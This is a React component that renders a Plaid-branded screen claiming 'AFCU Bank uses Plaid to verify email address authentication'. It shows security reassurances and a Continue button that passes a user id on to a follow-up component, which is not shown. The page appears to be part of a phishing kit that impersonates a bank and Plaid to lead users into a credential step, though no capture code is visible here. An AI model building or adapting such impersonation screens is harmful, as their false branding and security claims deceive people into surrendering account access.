import * as React from 'react';
import Box from '@mui/material/Box';
import Fade from '@mui/material/Fade';
import Button from '@mui/material/Button';
import CircularProgress from '@mui/material/CircularProgress';
import Typography from '@mui/material/Typography';
import AlertDialog from './AlertDialog';
import SkeletonLoad from './SkeletonLoad';
import { CssBaseline, Paper } from '@mui/material';
import { Cable, CableOutlined, ConnectingAirportsOutlined, EmailRounded, VisibilityOffOutlined } from '@mui/icons-material';
import { createTheme, ThemeProvider } from '@mui/material/styles';
import PlaidTwo from './PlaidTwo';

export default function Plaid(userid) {

    const [showPlaidTwo, setPlaidTwo] = React.useState(false); 

   

  const handleClickLoading = () => {

    setPlaidTwo(true); 


    
  };


  const theme = createTheme({
    status: {
      danger: '#e53e3e',
    },
    palette: {
      primary: {
        main: '#000000',
        darker: '#053e85',
      },
      neutral: {
        main: '#64748B',
        contrastText: '#fff',
      },
    },
  });

  return (
    <div>

        {!showPlaidTwo && (
            <div>

            <img src='/bank.png'></img>

            <div>
                <div className='text-center'>
                <span className='font-bold '>AFCU</span> 
                <span> Bank uses</span>
                <span className='font-bold'> Plaid</span>
                </div>


                <div className='text-center text-xs font-medium'>to verify email address authentication</div>

                <div className='flex flex-row mt-5 items-center ml-6'>
                    <CableOutlined fontSize='medium' className='mr-2'/>
                    <div className='flex flex-col'>
                        <div className='font-bold text-sm'>Verify Securely</div>
                        <div className='text-xs font-medium w-[200px]'>Plaid lets you securely authenticate your email account in seconds</div>
                    </div>
                </div>

                <div className='flex flex-row mt-5 items-center ml-6'>
                    <VisibilityOffOutlined fontSize='medium' className='mr-2'/>
                    <div className='flex flex-col'>
                        <div className='font-bold text-sm'>Your data is secure</div>
                        <div className='text-xs font-medium w-[200px]'>The session and all requests are encrypted with 256-bit encryption</div>
                    </div>
                </div>
                <div className='p-6'>
                    <ThemeProvider theme={theme}>
                <Button onClick={handleClickLoading} color='primary'  type="submit" variant="contained" fullWidth={true}>Continue</Button>
                </ThemeProvider>
                </div>
            </div>
            </div>

)}

{showPlaidTwo && <PlaidTwo userid={userid}/>}

            </div>
 
    
  );
}

